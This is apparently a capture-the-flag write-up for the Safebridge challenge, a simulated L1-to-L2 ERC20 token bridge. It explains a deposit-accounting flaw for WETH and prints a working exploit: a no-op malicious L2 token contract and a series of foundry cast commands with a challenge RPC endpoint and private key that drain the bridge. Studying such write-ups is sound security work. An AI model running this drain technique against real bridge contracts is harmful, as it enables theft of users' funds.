


# Challenge

The Safebridge challenge simulates a L1->L2 bridge, which can be used to brige all kinds of ERC20 tokens. The most important files for the challenge are the `L1ERC20Bridge.sol` and the `L2ERC20Bridge.sol`. The 2 files handle all the transactions from L1 to L2 and vice versa.

# Analysis of the vulnerability

Whenever a token gets deposited on L1 the `_initiateERC20Deposit()` function gets called. 


```solidity
function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
    internal
{
    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

    bytes memory message;
    if (_l1Token == weth) {
        message = abi.encodeWithSelector(
            IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
        );
    } else {
        message =
            abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
    }

    sendCrossDomainMessage(l2TokenBridge, message);

    // This where we fuck up
    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
}
```

Unfortunately if the `_l1Token` is WETH and `_l2Token` is any other token than L2WETH, the user will be issued L2WETH on L2 while the contracts storage adds a deposit of L1WETH->UserToken. A user can then use the issued L2WETH to redeem for the 2ether L1WETH that were deposited during the setup and then use 2ether of his L2 token to redeem the 2ether of WETH he deposited.


# Exploit

The isseu can be split into multiple steps.

1. Wrap 2 ether in L1WETH
2. Deploy a malicious token contract on L2 called SCAM
3. Deposit 2ether L1WETH->SCAM on the L1-Bridge
4. L2-Bridge will automatically withdraw WETH to the user
4. Deposit 2ether of WETH on L2-Bridge
5. Deposit 2ether of SCAM on L2-Bridge
6. Both will automatically withdraw 2ether of WETH for you on L1
7. The bridge is now empty and the challenge finished.

An exemplary malicious token to deploy on L2 can be found below.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IL2StandardERC20 {
    function l1Token() external returns (address);

    function mint(address _to, uint256 _amount) external;

    function burn(address _from, uint256 _amount) external;

    event Mint(address indexed _account, uint256 _amount);
    event Burn(address indexed _account, uint256 _amount);
}

contract ScamToken{
    address public l1Token;

    constructor(address _l1Token) {
        l1Token = _l1Token;
    }

    function supportsInterface(bytes4 _interfaceId) public pure returns (bool) {
        bytes4 firstSupportedInterface = bytes4(keccak256("supportsInterface(bytes4)")); // ERC165
        bytes4 secondSupportedInterface =
            IL2StandardERC20.l1Token.selector ^ IL2StandardERC20.mint.selector ^ IL2StandardERC20.burn.selector;
        return _interfaceId == firstSupportedInterface || _interfaceId == secondSupportedInterface;
    }

    function mint(address _to, uint256 _amount) public virtual {

    }

    function burn(address _from, uint256 _amount) public virtual {

    }
}
```

The exploit can be run using the following foundry cast commands.

```solidity
RPCL1="http://47.251.56.125:8545/DGmkZgdXKHZWhlzOurJlcGte/l1"
RPCL2="http://47.251.56.125:8545/DGmkZgdXKHZWhlzOurJlcGte/l2"
KEY=0x15a1e7b242c99889c96a134b0bcc3270e97cdd47b1861285d9f5041cee469f32
CHALLENGE=0xE12c45392Ec952bc570b1AfB79dc1901490993B1
BRIDGEL2=0x420000000000000000000000000000000000baBe
WETHL2=0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000

// Get WETH
cast call --rpc-url $RPCL1 $CHALLENGE "WETH()(address)"
WETHL1=0x1eaf88837a01eD24511a23500F15a3E1Ea70207E

// Get L1BRIDGE
cast call --rpc-url $RPCL1 $CHALLENGE "BRIDGE()(address)"
BRIDGEL1=0x3FF9CA7474cDC867A9927b4C47F81da199CA327B

// Deposit 2 eth
cast send --rpc-url $RPCL1 --value 2ether --private-key $KEY $WETHL1 "deposit()"

// Approve bridge for WETH
cast send --rpc-url $RPCL1 --private-key $KEY $WETHL1 "approve(address,uint256)" $BRIDGEL1 2ether

// Deploy ScamCoin
forge create --rpc-url $RPCL2 --private-key $KEY src/ScamToken.sol:ScamToken --constructor-args $WETHL1

// Save our Scamcoin
SCAM=0x29e69e538145299eaF0F476B6d6A53BFEa341E2e

// Deposit L1WETH to SCAM
cast send --rpc-url $RPCL1 --private-key $KEY $BRIDGEL1 "depositERC20(address,address,uint256)" $WETHL1 $SCAM 2ether

// Deposit 2 eth of WETH
cast send --rpc-url $RPCL2 --private-key $KEY $BRIDGEL2 "withdraw(address,uint256)" $WETHL2 2ether

// Deposit 2 eth of scam
cast send --rpc-url $RPCL2 --private-key $KEY $BRIDGEL2 "withdraw(address,uint256)" $SCAM 2ether
```

This yields you the flag `rwctf{yoU_draINED_BriD6E}`.
